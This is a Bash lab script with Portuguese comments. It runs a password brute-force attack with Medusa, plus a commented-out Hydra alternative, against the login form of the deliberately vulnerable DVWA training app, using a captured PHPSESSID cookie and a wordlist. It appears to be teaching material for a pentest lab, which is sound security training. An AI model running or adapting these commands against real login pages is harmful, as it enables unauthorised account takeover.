#!/usr/bin/env bash
# =============================================================================
# 02-brute-dvwa.sh
# Cenário 2 — Força bruta no formulário web do DVWA (página "Brute Force").
#
# A página /vulnerabilities/brute/ envia usuário e senha por GET e, no nível de
# segurança LOW, não usa token CSRF — ideal para automação com Medusa/Hydra.
#
# PRÉ-REQUISITOS:
#   1. Logar no DVWA pelo navegador e definir DVWA Security = low.
#   2. Capturar o cookie PHPSESSID (DevTools > Application > Cookies).
#
# Uso: ./02-brute-dvwa.sh <IP_ALVO> <PHPSESSID>
# Exemplo: ./02-brute-dvwa.sh 192.168.56.102 abcdef1234567890
# =============================================================================
set -euo pipefail

ALVO="${1:-192.168.56.102}"
SESSID="${2:?Informe o PHPSESSID capturado no navegador}"
PASS="../wordlists/senhas.txt"
USER="admin"

echo "[*] Brute force no formulário DVWA (security=low) contra ${ALVO}"

# -------------------------------------------------------------------------
# Abordagem A — Medusa (módulo web-form)
# -------------------------------------------------------------------------
# FORM          : caminho do formulário
# FORM-DATA     : método (get) e campos; o valor da senha fica vazio pois o
#                 Medusa injeta &password=<tentativa>
# DENIED-MESSAGE: texto que aparece quando a senha está ERRADA
# COOKIE        : sessão autenticada + nível de segurança
medusa -h "${ALVO}" \
       -u "${USER}" \
       -P "${PASS}" \
       -M web-form \
       -m FORM:"/vulnerabilities/brute/index.php" \
       -m FORM-DATA:"get?username=${USER}&password=&Login=Login" \
       -m DENIED-MESSAGE:"Username and/or password incorrect" \
       -m COOKIE:"security=low; PHPSESSID=${SESSID}" \
       -O "resultado_dvwa_${ALVO//./_}.log"

# -------------------------------------------------------------------------
# Abordagem B — Hydra (alternativa, costuma ser mais previsível no DVWA)
# Descomente para usar:
#
# hydra -l "${USER}" -P "${PASS}" "${ALVO}" http-get-form \
#   "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:\
# Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=${SESSID}"
# -------------------------------------------------------------------------

echo "[+] Concluído. Verifique o log por 'ACCOUNT FOUND'."
